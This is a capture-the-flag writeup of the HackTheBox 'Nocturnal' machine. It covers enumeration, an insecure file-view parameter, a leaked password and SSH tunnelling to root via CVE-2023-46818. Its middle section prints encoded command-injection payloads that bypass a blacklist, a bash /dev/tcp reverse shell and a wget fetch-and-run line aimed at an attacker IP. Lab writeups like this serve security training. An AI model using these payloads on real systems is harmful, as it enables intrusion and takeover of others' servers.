#  HackTheBox: Nocturnal - Writeup
This easy-difficulty box involves enumerating a web server to discover file upload functionality, which is leveraged to access user files and extract credentials. A backup sanitization bypass leads to remote code execution and shell access. After pivoting to the user tobias via SQLite hash cracking, SSH tunneling exposes a vulnerable internal web panel. Exploiting CVE-2023-46818 grants root access. The box combines web fuzzing, input encoding, credential reuse, and real-world CVE exploitation.


We start with a nmap scan, which gives us two opens ports;
Port 22 (SSH)
Port 80 (nginx web server)

![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Nocturnal/Screenshots/image1.png)
 
Using gobuster, we’re able to enumerate the directories present in the web server. Upon which we’re given; 
/view.php
/admin.php
/backups
 
![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Nocturnal/Screenshots/image2.png)

An account is then created, to look for what services the website offers.
After logging in, we can upload a file which could lead to a potential reverse-shell, however sanitisation is put in place so that is not the correct route.
Upon uploading the potential ‘reverse-shell’ file we are able to view it, and it uses the parameters; username and file. We could access the administrator account from here.

![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Nocturnal/Screenshots/image3.png)
 
Changing the user to admin for testing, it works just not the account.
 
![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Nocturnal/Screenshots/image4.png)

Burp Intruder can be used to look for potential usernames that we can access, we supply it with the payload and begin the attack.

![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Nocturnal/Screenshots/image5.png)
 
The results of the attack show us, that Amanda is a user with a file present in it, seen by the higher then usual length of response.

![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Nocturnal/Screenshots/image6.png)

Going to amanda’s account we see the file ‘privacy.odt’ which contains some information about amanda and her credentials.

![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Nocturnal/Screenshots/image7.png)
 
Nocturnal has set the following temporary password for you: arHkG7HAI68X8s1J. This password has been set for all our services, so it is essential that you change it on your first login to ensure the security of your account and our infrastructure.
The file has been created and provided by Nocturnal's IT team. If you have any questions or need additional assistance during the password change process, please do not hesitate to contact us.
Remember that maintaining the security of your credentials is paramount to protecting your information and that of the company. We appreciate your prompt attention to this matter.
                                                                                                                                                                                    
![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Nocturnal/Screenshots/image8.png)
 
Getting the backup, we obtain the files out of which on of them contain a cleanEntry function, used to sanitise the password set for the backup file. Some of the characters such as; ;, &, | , etc. aren’t allowed. From here we can form a reverse-shell, that doesn’t use the blacklisted characters through encoding.
 
![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Nocturnal/Screenshots/image8.png)

![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Nocturnal/Screenshots/image9.png)

We then form a reverse-shell payload that bypasses the input sanitization, but it doesn’t work as intended, meaning that we must try another way to construct the payload.
bash%09-i%09%3E/dev/tcp/10.10.14.219/443%09%3C/dev/tcp/10.10.14.219/443
 
![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Nocturnal/Screenshots/image10.png)

The payload is inserted into script.sh and downloaded onto the web server. 
%0abash%09-c%09"wget%09http://10.10.14.219:8000/script.sh"&backup=

![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Nocturnal/Screenshots/image11.png)
 
Which gives a successful response.
%0abash%09-c%09”bash%09script.sh”&backup=

![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Nocturnal/Screenshots/image12.png)
 
Now, the payload stored in the web server is run to gain a reverse-shell, setting up a listener on my machine.
 
![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Nocturnal/Screenshots/image13.png)

![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Nocturnal/Screenshots/image14.png)

Using the shell, I’m able to obtain the hash for user ‘tobias’, in the nocturnal_database.db.

![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Nocturnal/Screenshots/image15.png)
 
Upon cracking the password, I can SSH into tobias, gaining the user flag.

![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Nocturnal/Screenshots/image18.png)
 
Further enumeration reveals a http web server being hosted, using SSH Tunnelling I’m able to host the web server on my machine.

![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Nocturnal/Screenshots/image19.png)
 
Upon logging in as admin, with same credentials as tobias we see this version of the ISP is vulnerable to RCE.

![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Nocturnal/Screenshots/image20.png)
 
Git clone https://github.com/ajdumanhug/CVE-2023-46818
Running the exploit, we’re able to obtain the root shell, and obtain the root flag.
 
![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Nocturnal/Screenshots/image21.png)

![Image Alt](https://github.com/mfahdk/Writeups/blob/main/HackTheBox/Nocturnal/Screenshots/image23.png)
 
